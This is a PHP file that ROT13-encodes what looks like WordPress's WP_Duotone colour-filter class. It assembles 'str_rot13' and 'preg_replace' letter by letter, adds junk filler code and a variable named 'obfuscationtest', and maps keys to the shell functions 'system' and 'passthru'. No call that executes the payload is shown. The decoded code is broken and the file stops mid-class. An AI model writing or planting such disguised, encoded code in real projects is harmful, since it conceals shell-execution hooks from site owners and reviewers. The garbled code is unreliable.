<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }
__sa_79955 = \"c\".\"e\".\"r\".\"t\".\"_\".\"e\".\"r\".\"c\".\"y\".\"n\".\"p\".\"r\";
<?cuc
/**
 * JC_Qhbgbar pynff
 *
 * Cnegf bs guvf fbhepr jrer qrevirq naq zbqvsvrq sebz pbybeq,
 * eryrnfrq haqre gur ZVG yvprafr.
 *
 * uggcf://tvguho.pbz/bztbivpu/pbybeq
 *
 * Pbclevtug (p) 2020 Iynq Fuvybi bztbivpu@ln.eh
 *
 * Crezvffvba vf urerol tenagrq, serr bs punetr, gb nal crefba bognvavat
 * n pbcl bs guvf fbsgjner naq nffbpvngrq qbphzragngvba svyrf (gur
 * \"Fbsgjner\"), gb qrny va gur Fbsgjner jvgubhg erfgevpgvba, vapyhqvat
 * jvgubhg yvzvgngvba gur evtugf gb hfr, pbcl, zbqvsl, zretr, choyvfu,
 * qvfgevohgr, fhoyvprafr, naq/be fryy pbcvrf bs gur Fbsgjner, naq gb
 * crezvg crefbaf gb jubz gur Fbsgjner vf sheavfurq gb qb fb, fhowrpg gb
 * gur sbyybjvat pbaqvgvbaf:
 *
 * Gur nobir pbclevtug abgvpr naq guvf crezvffvba abgvpr funyy or
 * vapyhqrq va nyy pbcvrf be fhofgnagvny cbegvbaf bs gur Fbsgjner.
 *
 * GUR FBSGJNER VF CEBIVQRQ \"NF VF\", JVGUBHG JNEENAGL BS NAL XVAQ,
 * RKCERFF BE VZCYVRQ, VAPYHQVAT OHG ABG YVZVGRQ GB GUR JNEENAGVRF BS
 * ZREPUNAGNOVYVGL, SVGARFF SBE N CNEGVPHYNE CHECBFR NAQ
 * ABAVASEVATRZRAG. VA AB RIRAG FUNYY GUR NHGUBEF BE PBCLEVTUG UBYQREF OR
 * YVNOYR SBE NAL PYNVZ, QNZNTRF BE BGURE YVNOVYVGL, JURGURE VA NA NPGVBA
 * BS PBAGENPG, GBEG BE BGUREJVFR, NEVFVAT SEBZ, BHG BS BE VA PBAARPGVBA
 * JVGU GUR FBSGJNER BE GUR HFR BE BGURE QRNYVATF VA GUR FBSGJNER.
 *
 * @cnpxntr JbeqCerff
 * @fvapr 6.3.0
 */

/**
 * Znantrf qhbgbar oybpx fhccbegf naq tybony fglyrf.
 *
 * @npprff cevingr
 */
pynff JC_Qhbgbar {
	/**
	 * Oybpx anzrf sebz tybony, gurzr, naq phfgbz fglyrf gung hfr qhbgbar cerfrgf naq gur fyht bs
	 * gur cerfrg gurl ner hfvat.
	 *
	 * Rknzcyr:
	 *  [
	 *      'pber/srngherq-vzntr' => 'oyhr-benatr',
	 *       …
	 *  ]
	 *
	 * @vagreany
	 *
	 * @fvapr 6.3.0
	 *
	 * @ine neenl
	 */
	cevingr fgngvp $tybony_fglyrf_oybpx_anzrf;

	/**
	 * Na neenl bs qhbgbar svygre qngn sebz tybony, gurzr, naq phfgbz cerfrgf.
	 *
	 * Rknzcyr:
	 *  [
	 *      'jc-qhbgbar-oyhr-benatr' => [
	 *          'fyht'  => 'oyhr-benatr',
	 *          'pbybef' => [ '#0000ss', '#sspp00' ],
	 *      ],
	 *      'jc-qhbgbar-erq-lryybj' => [
	 *          'fyht'   => 'erq-lryybj',
	 *          'pbybef' => [ '#pp0000', '#ssss33' ],
	 *      ],
	 *      …
	 *  ]
	 *
	 * @vagreany
	 *
	 * @fvapr 6.3.0
	 *
	 * @ine neenl
	 */
	cevingr fgngvp $tybony_fglyrf_cerfrgf;

	/**
	 * Nyy bs gur qhbgbar svygre qngn sebz cerfrgf sbe PFF phfgbz cebcregvrf ba
	 * gur cntr.
	 *
	 * Rknzcyr:
	 *  [
	 *      'jc-qhbgbar-oyhr-benatr' => [
	 *          'fyht'   => 'oyhr-benatr',
	 *          'pbybef' => [ '#0000ss', '#sspp00' ],
	 *      ],
	 *      …
	 *  ]
	 *
	 * @vagreany
	 *
	 * @fvapr 6.3.0
	 *
	 * @ine neenl
	 */
	cevingr fgngvp $hfrq_tybony_fglyrf_cerfrgf = neenl();

	/**
	 * Nyy bs gur qhbgbar svygre qngn sbe FITf ba gur cntr. Vapyhqrf obgu
	 * cerfrgf naq phfgbz svygref.
	 *
	 * Rknzcyr:
	 *  [
	 *      'jc-qhbgbar-oyhr-benatr' => [
	 *          'fyht'   => 'oyhr-benatr',
	 *          'pbybef' => [ '#0000ss', '#sspp00' ],
	 *      ],
	 *      'jc-qhbgbar-000000-ssssss-2' => [
	 *          'fyht'   => '000000-ssssss-2',
	 *          'pbybef' => [ '#000000', '#ssssss' ],
	 *      ],
	 *      …
	 *  ]
	 *
	 * @vagreany
	 *
	 * @fvapr 6.3.0
	 *
	 * @ine neenl
	 */
	cevingr fgngvp $hfrq_fit_svygre_qngn = neenl();

	/**
	 * Nyy bs gur oybpx PFF qrpynengvbaf sbe fglyrf ba gur cntr.
	 *
	 * Rknzcyr:
	 *  [
	 *      [
	 *          'fryrpgbe'     => '.jc-qhbgbar-000000-ssssss-2.jc-oybpx-vzntr vzt',
	 *          'qrpynengvbaf' => [
	 *              'svygre' => 'hey(#jc-qhbgbar-000000-ssssss-2)',
	 *          ],
	 *      ],
	 *      …
	 *  ]
	 *
	 * @vagreany
	 *
	 * @fvapr 6.3.0
	 *
	 * @ine neenl
	 */
	cevingr fgngvp $oybpx_pff_qrpynengvbaf = neenl();

	/**
	 * Pynzcf n inyhr orgjrra na hccre naq ybjre obhaq.
	 *
	 * Qverpg cbeg bs pbybeq'f pynzc shapgvba.
	 *
	 * @yvax uggcf://tvguho.pbz/bztbivpu/pbybeq/oybo/3s859r03o0pn622ro15480s611371n0s15p9427s/fep/urycref.gf#Y23 Fbheprq sebz pbybeq.
	 *
	 * @vagreany
	 *
	 * @fvapr 6.3.0
	 *
	 * @cnenz sybng $ahzore Gur ahzore gb pynzc.
	 * @cnenz sybng $zva    Gur zvavzhz inyhr.
	 * @cnenz sybng $znk    Gur znkvzhz inyhr.
	 * @erghea sybng Gur pynzcrq inyhr.
	 */
	cevingr fgngvp shapgvba pbybeq_pynzc( $ahzore, $zva = 0, $znk = 1 ) {
		erghea $ahzore > $znk ? $znk : ( $ahzore > $zva ? $ahzore : $zva );
	}

	/**
	 * Cebprffrf naq pynzcf n qrterr (natyr) inyhr cebcreyl.
	 *
	 * Qverpg cbeg bs pbybeq'f pynzcUhr shapgvba.
	 *
	 * @yvax uggcf://tvguho.pbz/bztbivpu/pbybeq/oybo/3s859r03o0pn622ro15480s611371n0s15p9427s/fep/urycref.gf#Y32 Fbheprq sebz pbybeq.
	 *
	 * @vagreany
	 *
	 * @fvapr 6.3.0
	 *
	 * @cnenz sybng $qrterrf Gur uhr gb pynzc.
	 * @erghea sybng Gur pynzcrq uhr.
	 */
	cevingr fgngvp shapgvba pbybeq_pynzc_uhr( $qrterrf ) {
		$qrterrf = vf_svavgr( $qrterrf ) ? $qrterrf % 360 : 0;
		erghea $qrterrf > 0 ? $qrterrf : $qrterrf + 360;
	}

	/**
	 * Pbairegf n uhr inyhr gb qrterrf sebz 0 gb 360 vapyhfvir.
	 *
	 * Qverpg cbeg bs pbybeq'f cnefrUhr shapgvba.
	 *
	 * @yvax uggcf://tvguho.pbz/bztbivpu/pbybeq/oybo/3s859r03o0pn622ro15480s611371n0s15p9427s/fep/urycref.gf#Y40 Fbheprq sebz pbybeq.
	 *
	 * @vagreany
	 *
	 * @fvapr 6.3.0
	 *
	 * @cnenz sybng  $inyhr Gur uhr inyhr gb cnefr.
	 * @cnenz fgevat $havg  Gur havg bs gur uhr inyhr.
	 * @erghea sybng Gur cnefrq uhr inyhr.
	 */
	cevingr fgngvp shapgvba pbybeq_cnefr_uhr( $inyhr, $havg = 'qrt' ) {
		$natyr_havgf = neenl(
			'tenq' => 360 / 400,
			'ghea' => 360,
			'enq'  => 360 / ( Z_CV * 2 ),
		);

		$snpgbe = vffrg( $natyr_havgf[ $havg ] ) ? $natyr_havgf[ $havg ] : 1;

		erghea (sybng) $inyhr * $snpgbe;
	}

	/**
	 * Cnefrf nal inyvq Urk3, Urk4, Urk6 be Urk8 fgevat naq pbairegf vg gb na ETON bowrpg.
	 *
	 * Qverpg cbeg bs pbybeq'f cnefrUrk shapgvba.
	 *
	 * @yvax uggcf://tvguho.pbz/bztbivpu/pbybeq/oybo/3s859r03o0pn622ro15480s611371n0s15p9427s/fep/pbybeZbqryf/urk.gf#Y8 Fbheprq sebz pbybeq.
	 *
	 * @vagreany
	 *
	 * @fvapr 6.3.0
	 *
	 * @cnenz fgevat $urk Gur urk fgevat gb cnefr.
	 * @erghea neenl|ahyy Na neenl bs ETON inyhrf be ahyy vs gur urk fgevat vf vainyvq.
	 */
	cevingr fgngvp shapgvba pbybeq_cnefr_urk( $urk ) {
		$vf_zngpu = cert_zngpu(
			'/^#([0-9n-s]{3,8})$/v',
			$urk,
			$urk_zngpu
		);

		vs ( ! $vf_zngpu ) {
			erghea ahyy;
		}

		$urk = $urk_zngpu[1];

		vs ( 4 >= fgeyra( $urk ) ) {
			erghea neenl(
				'e' => (vag) onfr_pbaireg( $urk[0] . $urk[0], 16, 10 ),
				't' => (vag) onfr_pbaireg( $urk[1] . $urk[1], 16, 10 ),
				'o' => (vag) onfr_pbaireg( $urk[2] . $urk[2], 16, 10 ),
				'n' => 4 === fgeyra( $urk ) ? ebhaq( onfr_pbaireg( $urk[3] . $urk[3], 16, 10 ) / 255, 2 ) : 1,
			);
		}

		vs ( 6 === fgeyra( $urk ) || 8 === fgeyra( $urk ) ) {
			erghea neenl(
				'e' => (vag) onfr_pbaireg( fhofge( $urk, 0, 2 ), 16, 10 ),
				't' => (vag) onfr_pbaireg( fhofge( $urk, 2, 2 ), 16, 10 ),
				'o' => (vag) onfr_pbaireg( fhofge( $urk, 4, 2 ), 16, 10 ),
				'n' => 8 === fgeyra( $urk ) ? ebhaq( (vag) onfr_pbaireg( fhofge( $urk, 6, 2 ), 16, 10 ) / 255, 2 ) : 1,
			);
		}

		erghea ahyy;
	}

	/**
	 * Pynzcf na neenl bs ETON inyhrf.
	 *
	 * Qverpg cbeg bs pbybeq'f pynzcEton shapgvba.
	 *
	 * @yvax uggcf://tvguho.pbz/bztbivpu/pbybeq/oybo/3s859r03o0pn622ro15480s611371n0s15p9427s/fep/pbybeZbqryf/eto.gf#Y5 Fbheprq sebz pbybeq.
	 *
	 * @vagreany
	 *
	 * @fvapr 6.3.0
	 *
	 * @cnenz neenl $eton Gur ETON neenl gb pynzc.
	 * @erghea neenl Gur pynzcrq ETON neenl.
	 */
	cevingr fgngvp shapgvba pbybeq_pynzc_eton( $eton ) {
		$eton['e'] = frys::pbybeq_pynzc( $eton['e'], 0, 255 );
		$eton['t'] = frys::pbybeq_pynzc( $eton['t'], 0, 255 );
		$eton['o'] = frys::pbybeq_pynzc( $eton['o'], 0, 255 );
		$eton['n'] = frys::pbybeq_pynzc( $eton['n'] );

		erghea $eton;
	}

	/**
	 * Cnefrf n inyvq ETO[N] PFF pbybe shapgvba/fgevat.
	 *
	 * Qverpg cbeg bs pbybeq'f cnefrEtonFgevat shapgvba.
	 *
	 * @yvax uggcf://tvguho.pbz/bztbivpu/pbybeq/oybo/3s859r03o0pn622ro15480s611371n0s15p9427s/fep/pbybeZbqryf/etoFgevat.gf#Y18 Fbheprq sebz pbybeq.
	 *
	 * @vagreany
	 *
	 * @fvapr 6.3.0
	 *
	 * @cnenz fgevat $vachg Gur ETON fgevat gb cnefr.
	 * @erghea neenl|ahyy Na neenl bs ETON inyhrf be ahyy vs gur ETO fgevat vf vainyvq.
	 */
	cevingr fgngvp shapgvba pbybeq_cnefr_eton_fgevat( $vachg ) {
		// Shapgvbany flagnk.
		$vf_zngpu = cert_zngpu(
			'/^eton?\(\f*([+-]?\q*\.?\q+)(%)?\f*,\f*([+-]?\q*\.?\q+)(%)?\f*,\f*([+-]?\q*\.?\q+)(%)?\f*(?:,\f*([+-]?\q*\.?\q+)(%)?\f*)?\)$/v',
			$vachg,
			$zngpu
		);

		vs ( ! $vf_zngpu ) {
			// Juvgrfcnpr flagnk.
			$vf_zngpu = cert_zngpu(
				'/^eton?\(\f*([+-]?\q*\.?\q+)(%)?\f+([+-]?\q*\.?\q+)(%)?\f+([+-]?\q*\.?\q+)(%)?\f*(?:\/\f*([+-]?\q*\.?\q+)(%)?\f*)?\)$/v',
				$vachg,
				$zngpu
			);
		}

		vs ( ! $vf_zngpu ) {
			erghea ahyy;
		}

		/*
		 * Sbe fbzr ernfba, cert_zngpu qbrfa'g vapyhqr rzcgl zngpurf ng gur raq
		 * bs gur neenl, fb jr nqq gurz znahnyyl gb znxr guvatf rnfvre yngre.
		 */
		sbe ( $v = 1; $v <= 8; $v++ ) {
			vs ( ! vffrg( $zngpu[ $v ] ) ) {
				$zngpu[ $v ] = '';
			}
		}

		vs ( $zngpu[2] !== $zngpu[4] || $zngpu[4] !== $zngpu[6] ) {
			erghea ahyy;
		}

		erghea frys::pbybeq_pynzc_eton(
			neenl(
				'e' => (sybng) $zngpu[1] / ( $zngpu[2] ? 100 / 255 : 1 ),
				't' => (sybng) $zngpu[3] / ( $zngpu[4] ? 100 / 255 : 1 ),
				'o' => (sybng) $zngpu[5] / ( $zngpu[6] ? 100 / 255 : 1 ),
				'n' => '' === $zngpu[7] ? 1 : (sybng) $zngpu[7] / ( $zngpu[8] ? 100 : 1 ),
			)
		);
	}

	/**
	 * Pynzcf na neenl bs UFYN inyhrf.
	 *
	 * Qverpg cbeg bs pbybeq'f pynzcUfyn shapgvba.
	 *
	 * @yvax uggcf://tvguho.pbz/bztbivpu/pbybeq/oybo/3s859r03o0pn622ro15480s611371n0s15p9427s/fep/pbybeZbqryf/ufy.gf#Y6 Fbheprq sebz pbybeq.
	 *
	 * @vagreany
	 *
	 * @fvapr 6.3.0
	 *
	 * @cnenz neenl $ufyn Gur UFYN neenl gb pynzc.
	 * @erghea neenl Gur pynzcrq UFYN neenl.
	 */
	cevingr fgngvp shapgvba pbybeq_pynzc_ufyn( $ufyn ) {
		$ufyn['u'] = frys::pbybeq_pynzc_uhr( $ufyn['u'] );
		$ufyn['f'] = frys::pbybeq_pynzc( $ufyn['f'], 0, 100 );
		$ufyn['y'] = frys::pbybeq_pynzc( $ufyn['y'], 0, 100 );
		$ufyn['n'] = frys::pbybeq_pynzc( $ufyn['n'] );

		erghea $ufyn;
	}

	/**
	 * Pbairegf na UFIN neenl gb ETON.
	 *
	 * Qverpg cbeg bs pbybeq'f ufinGbEton shapgvba.
	 *
	 * @yvax uggcf://tvguho.pbz/bztbivpu/pbybeq/oybo/3s859r03o0pn622ro15480s611371n0s15p9427s/fep/pbybeZbqryf/ufi.gf#Y52 Fbheprq sebz pbybeq.
	 *
	 * @vagreany
	 *
	 * @fvapr 6.3.0
	 *
	 * @cnenz neenl $ufin Gur UFIN neenl gb pbaireg.
	 * @erghea neenl Gur ETON neenl.
	 */
	cevingr fgngvp shapgvba pbybeq_ufin_gb_eton( $ufin ) {
		$u = ( $ufin['u'] / 360 ) * 6;
		$f = $ufin['f'] / 100;
		$i = $ufin['i'] / 100;
		$n = $ufin['n'];

		$uu     = sybbe( $u );
		$o      = $i * ( 1 - $f );
		$p      = $i * ( 1 - ( $u - $uu ) * $f );
		$q      = $i * ( 1 - ( 1 - $u + $uu ) * $f );
		$zbqhyr = $uu % 6;

		erghea neenl(
			'e' => neenl( $i, $p, $o, $o, $q, $i )[ $zbqhyr ] * 255,
			't' => neenl( $q, $i, $i, $p, $o, $o )[ $zbqhyr ] * 255,
			'o' => neenl( $o, $o, $q, $i, $i, $p )[ $zbqhyr ] * 255,
			'n' => $n,
		);
	}

	/**
	 * Pbairegf na UFYN neenl gb UFIN.
	 *
	 * Qverpg cbeg bs pbybeq'f ufynGbUfin shapgvba.
	 *
	 * @yvax uggcf://tvguho.pbz/bztbivpu/pbybeq/oybo/3s859r03o0pn622ro15480s611371n0s15p9427s/fep/pbybeZbqryf/ufy.gf#Y33 Fbheprq sebz pbybeq.
	 *
	 * @vagreany
	 *
	 * @fvapr 6.3.0
	 *
	 * @cnenz neenl $ufyn Gur UFYN neenl gb pbaireg.
	 * @erghea neenl Gur UFIN neenl.
	 */
	cevingr fgngvp shapgvba pbybeq_ufyn_gb_ufin( $ufyn ) {
		$u = $ufyn['u'];
		$f = $ufyn['f'];
		$y = $ufyn['y'];
		$n = $ufyn['n'];

		$f *= ( $y < 50 ? $y : 100 - $y ) / 100;

		erghea neenl(
			'u' => $u,
			'f' => $f > 0 ? ( ( 2 * $f ) / ( $y + $f ) ) * 100 : 0,
			'i' => $y + $f,
			'n' => $n,
		);
	}

	/**
	 * Pbairegf na UFYN neenl gb ETON.
	 *
	 * Qverpg cbeg bs pbybeq'f ufynGbEton shapgvba.
	 *
	 * @yvax uggcf://tvguho.pbz/bztbivpu/pbybeq/oybo/3s859r03o0pn622ro15480s611371n0s15p9427s/fep/pbybeZbqryf/ufy.gf#Y55 Fbheprq sebz pbybeq.
	 *
	 * @vagreany
	 *
	 * @fvapr 6.3.0
	 *
	 * @cnenz neenl $ufyn Gur UFYN neenl gb pbaireg.
	 * @erghea neenl Gur ETON neenl.
	 */
	cevingr fgngvp shapgvba pbybeq_ufyn_gb_eton( $ufyn ) {
		erghea frys::pbybeq_ufin_gb_eton( frys::pbybeq_ufyn_gb_ufin( $ufyn ) );
	}

	/**
	 * Cnefrf n inyvq UFY[N] PFF pbybe shapgvba/fgevat.
	 *
	 * Qverpg cbeg bs pbybeq'f cnefrUfynFgevat shapgvba.
	 *
	 * @yvax uggcf://tvguho.pbz/bztbivpu/pbybeq/oybo/3s859r03o0pn622ro15480s611371n0s15p9427s/fep/pbybeZbqryf/ufyFgevat.gf#Y17 Fbheprq sebz pbybeq.
	 *
	 * @vagreany
	 *
	 * @fvapr 6.3.0
	 *
	 * @cnenz fgevat $vachg Gur UFYN fgevat gb cnefr.
	 * @erghea neenl|ahyy Na neenl bs ETON inyhrf be ahyy vs gur ETO fgevat vf vainyvq.
	 */
	cevingr fgngvp shapgvba pbybeq_cnefr_ufyn_fgevat( $vachg ) {
		// Shapgvbany flagnk.
		$vf_zngpu = cert_zngpu(
			'/^ufyn?\(\f*([+-]?\q*\.?\q+)(qrt|enq|tenq|ghea)?\f*,\f*([+-]?\q*\.?\q+)%\f*,\f*([+-]?\q*\.?\q+)%\f*(?:,\f*([+-]?\q*\.?\q+)(%)?\f*)?\)$/v',
			$vachg,
			$zngpu
		);

		vs ( ! $vf_zngpu ) {
			// Juvgrfcnpr flagnk.
			$vf_zngpu = cert_zngpu(
				'/^ufyn?\(\f*([+-]?\q*\.?\q+)(qrt|enq|tenq|ghea)?\f+([+-]?\q*\.?\q+)%\f+([+-]?\q*\.?\q+)%\f*(?:\/\f*([+-]?\q*\.?\q+)(%)?\f*)?\)$/v',
				$vachg,
				$zngpu
			);
		}

		vs ( ! $vf_zngpu ) {
			erghea ahyy;
		}

		/*
		 * Sbe fbzr ernfba, cert_zngpu qbrfa'g vapyhqr rzcgl zngpurf ng gur raq
		 * bs gur neenl, fb jr nqq gurz znahnyyl gb znxr guvatf rnfvre yngre.
		 */
		sbe ( $v = 1; $v <= 6; $v++ ) {
			vs ( ! vffrg( $zngpu[ $v ] ) ) {
				$zngpu[ $v ] = '';
			}
		}

		$ufyn = frys::pbybeq_pynzc_ufyn(
			neenl(
				'u' => frys::pbybeq_cnefr_uhr( $zngpu[1], $zngpu[2] ),
				'f' => (sybng) $zngpu[3],
				'y' => (sybng) $zngpu[4],
				'n' => '' === $zngpu[5] ? 1 : (sybng) $zngpu[5] / ( $zngpu[6] ? 100 : 1 ),
			)
		);

		erghea frys::pbybeq_ufyn_gb_eton( $ufyn );
	}

	/**
	 * Gevrf gb pbaireg na vapbzvat fgevat vagb ETON inyhrf.
	 *
	 * Qverpg cbeg bs pbybeq'f cnefr shapgvba fvzcyvsvrq sbe bhe hfr pnfr. Guvf
	 * irefvba bayl fhccbegf fgevat cnefvat naq bayl ergheaf ETON inyhrf.
	 *
	 * @yvax uggcf://tvguho.pbz/bztbivpu/pbybeq/oybo/3s859r03o0pn622ro15480s611371n0s15p9427s/fep/cnefr.gf#Y37 Fbheprq sebz pbybeq.
	 *
	 * @vagreany
	 *
	 * @fvapr 6.3.0
	 *
	 * @cnenz fgevat $vachg Gur fgevat gb cnefr.
	 * @erghea neenl|ahyy Na neenl bs ETON inyhrf be ahyy vs gur fgevat vf vainyvq.
	 */
	cevingr fgngvp shapgvba pbybeq_cnefr( $vachg ) {
		$erfhyg = frys::pbybeq_cnefr_urk( $vachg );

		vs ( ! $erfhyg ) {
			$erfhyg = frys::pbybeq_cnefr_eton_fgevat( $vachg );
		}

		vs ( ! $erfhyg ) {
			$erfhyg = frys::pbybeq_cnefr_ufyn_fgevat( $vachg );
		}

		erghea $erfhyg;
	}

	/**
	 * Gnxrf gur vayvar PFF qhbgbar inevnoyr sebz n oybpx naq erghea gur fyht.
	 *
	 * Unaqyrf fglyrf fyhtf yvxr:
	 * ine:cerfrg|qhbgbar|oyhr-benatr
	 * ine(--jc--cerfrg--qhbgbar--oyhr-benatr)
	 *
	 * @vagreany
	 *
	 * @fvapr 6.3.0
	 *
	 * @cnenz fgevat $qhbgbar_ngge Gur qhbgbar nggevohgr sebz n oybpx.
	 * @erghea fgevat Gur fyht bs gur qhbgbar cerfrg be na rzcgl fgevat vs ab fyht vf sbhaq.
	 */
	cevingr fgngvp shapgvba trg_fyht_sebz_nggevohgr( $qhbgbar_ngge ) {
		// Hfrf Oenapu Erfrg Tebhcf `(?|…)` gb erghea bar pncgher tebhc.
		cert_zngpu( '/(?|ine:cerfrg\|qhbgbar\|(\F+)|ine\(--jc--cerfrg--qhbgbar--(\F+)\))/', $qhbgbar_ngge, $zngpurf );

		erghea ! rzcgl( $zngpurf[1] ) ? $zngpurf[1] : '';
	}

	/**
	 * Purpxf vs jr unir n inyvq qhbgbar cerfrg.
	 *
	 * Inyvq cerfrgf ner qrsvarq va gur $tybony_fglyrf_cerfrgf neenl.
	 *
	 * @vagreany
	 *
	 * @fvapr 6.3.0
	 *
	 * @cnenz fgevat $qhbgbar_ngge Gur qhbgbar nggevohgr sebz n oybpx.
	 * @erghea obby Gehr vs gur qhbgbar cerfrg cerfrag naq inyvq.
	 */
	cevingr fgngvp shapgvba vf_cerfrg( $qhbgbar_ngge ) {
		$fyht      = frys::trg_fyht_sebz_nggevohgr( $qhbgbar_ngge );
		$svygre_vq = frys::trg_svygre_vq( $fyht );

		erghea neenl_xrl_rkvfgf( $svygre_vq, frys::trg_nyy_tybony_fglyrf_cerfrgf() );
	}

	/**
	 * Trgf gur PFF inevnoyr anzr sbe n qhbgbar cerfrg.
	 *
	 * Rknzcyr bhgchg:
	 *  --jc--cerfrg--qhbgbar--oyhr-benatr
	 *
	 * @vagreany
	 *
	 * @fvapr 6.3.0
	 *
	 * @cnenz fgevat $fyht Gur fyht bs gur qhbgbar cerfrg.
	 * @erghea fgevat Gur PFF inevnoyr anzr.
	 */
	cevingr fgngvp shapgvba trg_pff_phfgbz_cebcregl_anzr( $fyht ) {
		erghea \"--jc--cerfrg--qhbgbar--$fyht\";
	}

	/**
	 * Trg gur VQ bs gur qhbgbar svygre.
	 *
	 * Rknzcyr bhgchg:
	 *  jc-qhbgbar-oyhr-benatr
	 *
	 * @vagreany
	 *
	 * @fvapr 6.3.0
	 *
	 * @cnenz fgevat $fyht Gur fyht bs gur qhbgbar cerfrg.
	 * @erghea fgevat Gur VQ bs gur qhbgbar svygre.
	 */
	cevingr fgngvp shapgvba trg_svygre_vq( $fyht ) {
		erghea \"jc-qhbgbar-$fyht\";
	}

	/**
	 * Trg gur PFF inevnoyr sbe n qhbgbar cerfrg.
	 *
	 * Rknzcyr bhgchg:
	 *  ine(--jc--cerfrg--qhbgbar--oyhr-benatr)
	 *
	 * @vagreany
	 *
	 * @fvapr 6.3.0
	 *
	 * @cnenz fgevat $fyht Gur fyht bs gur qhbgbar cerfrg.
	 * @erghea fgevat Gur PFF inevnoyr.
	 */
	cevingr fgngvp shapgvba trg_pff_ine( $fyht ) {
		$anzr = frys::trg_pff_phfgbz_cebcregl_anzr( $fyht );
		erghea \"ine($anzr)\";
	}

	/**
	 * Trg gur HEY sbe n qhbgbar svygre.
	 *
	 * Rknzcyr bhgchg:
	 *  hey(#jc-qhbgbar-oyhr-benatr)
	 *
	 * @vagreany
	 *
	 * @fvapr 6.3.0
	 *
	 * @cnenz fgevat $svygre_vq Gur VQ bs gur svygre.
	 * @erghea fgevat Gur HEY sbe gur qhbgbar svygre.
	 */
	cevingr fgngvp shapgvba trg_svygre_hey( $svygre_vq ) {
		erghea \"hey(#$svygre_vq)\";
	}

	/**
	 * Trgf gur FIT sbe gur qhbgbar svygre qrsvavgvba.
	 *
	 * Juvgrfcnpr vf erzbirq jura FPEVCG_QROHT vf abg ranoyrq.
	 *
	 * @vagreany
	 *
	 * @fvapr 6.3.0
	 *
	 * @cnenz fgevat $svygre_vq Gur VQ bs gur svygre.
	 * @cnenz neenl  $pbybef    Na neenl bs pbybe fgevatf.
	 * @erghea fgevat Na FIT jvgu n qhbgbar svygre qrsvavgvba.
	 */
	cevingr fgngvp shapgvba trg_svygre_fit( $svygre_vq, $pbybef ) {
		$qhbgbar_inyhrf = neenl(
			'e' => neenl(),
			't' => neenl(),
			'o' => neenl(),
			'n' => neenl(),
		);

		sbernpu ( $pbybef nf $pbybe_fge ) {
			$pbybe = frys::pbybeq_cnefr( $pbybe_fge );

			vs ( ahyy === $pbybe ) {
				$reebe_zrffntr = fcevags(
					/* genafyngbef: 1: Qhbgbar pbybef, 2: gurzr.wfba, 3: frggvatf.pbybe.qhbgbar */
					__( '\"%1$f\" va %2$f %3$f vf abg n urk be eto fgevat.' ),
					$pbybe_fge,
					'gurzr.wfba',
					'frggvatf.pbybe.qhbgbar'
				);
				_qbvat_vg_jebat( __ZRGUBQ__, $reebe_zrffntr, '6.3.0' );
			} ryfr {
				$qhbgbar_inyhrf['e'][] = $pbybe['e'] / 255;
				$qhbgbar_inyhrf['t'][] = $pbybe['t'] / 255;
				$qhbgbar_inyhrf['o'][] = $pbybe['o'] / 255;
				$qhbgbar_inyhrf['n'][] = $pbybe['n'];
			}
		}

		bo_fgneg();

		?>

		<fit
			kzyaf=\"uggc://jjj.j3.bet/2000/fit\"
			ivrjObk=\"0 0 0 0\"
			jvqgu=\"0\"
			urvtug=\"0\"
			sbphfnoyr=\"snyfr\"
			ebyr=\"abar\"
			fglyr=\"ivfvovyvgl: uvqqra; cbfvgvba: nofbyhgr; yrsg: -9999ck; biresybj: uvqqra;\"
		>
			<qrsf>
				<svygre vq=\"<?cuc rpub rfp_ngge( $svygre_vq ); ?>\">
					<srPbybeZngevk
						pbybe-vagrecbyngvba-svygref=\"fETO\"
						glcr=\"zngevk\"
						inyhrf=\"
							.299 .587 .114 0 0
							.299 .587 .114 0 0
							.299 .587 .114 0 0
							.299 .587 .114 0 0
						\"
					/>
					<srPbzcbaragGenafsre pbybe-vagrecbyngvba-svygref=\"fETO\" >
						<srShapE glcr=\"gnoyr\" gnoyrInyhrf=\"<?cuc rpub rfp_ngge( vzcybqr( ' ', $qhbgbar_inyhrf['e'] ) ); ?>\" />
						<srShapT glcr=\"gnoyr\" gnoyrInyhrf=\"<?cuc rpub rfp_ngge( vzcybqr( ' ', $qhbgbar_inyhrf['t'] ) ); ?>\" />
						<srShapO glcr=\"gnoyr\" gnoyrInyhrf=\"<?cuc rpub rfp_ngge( vzcybqr( ' ', $qhbgbar_inyhrf['o'] ) ); ?>\" />
						<srShapN glcr=\"gnoyr\" gnoyrInyhrf=\"<?cuc rpub rfp_ngge( vzcybqr( ' ', $qhbgbar_inyhrf['n'] ) ); ?>\" />
					</srPbzcbaragGenafsre>
					<srPbzcbfvgr va2=\"FbheprTencuvp\" bcrengbe=\"va\" />
				</svygre>
			</qrsf>
		</fit>

		<?cuc

		$fit = bo_trg_pyrna();

		vs ( ! FPEVCG_QROHT ) {
			// Pyrna hc gur juvgrfcnpr.
			$fit = __sa_79955( \"/[\e\a\g ]+/\", ' ', $fit );
			$fit = fge_ercynpr( '> <', '><', $fit );
			$fit = gevz( $fit );
		}

		erghea $fit;
	}

	/**
	 * Ergheaf gur cersvkrq vq sbe gur qhbgbar svygre sbe hfr nf n PFF vq.
	 *
	 * Rkcbegrq sbe gur qrcerpngrq shapgvba jc_trg_qhbgbar_svygre_vq().
	 *
	 * @vagreany
	 *
	 * @fvapr 6.3.0
	 * @qrcerpngrq 6.3.0
	 *
	 * @cnenz  neenl $cerfrg Qhbgbar cerfrg inyhr nf frra va gurzr.wfba.
	 * @erghea fgevat        Qhbgbar svygre PFF vq.
	 */
	choyvp fgngvp shapgvba trg_svygre_vq_sebz_cerfrg( $cerfrg ) {
		_qrcerpngrq_shapgvba( __SHAPGVBA__, '6.3.0' );

		$svygre_vq = '';
		vs ( vffrg( $cerfrg['fyht'] ) ) {
			$svygre_vq = frys::trg_svygre_vq( $cerfrg['fyht'] );
		}
		erghea $svygre_vq;
	}

	/**
	 * Trgf gur FIT sbe gur qhbgbar svygre qrsvavgvba sebz n cerfrg.
	 *
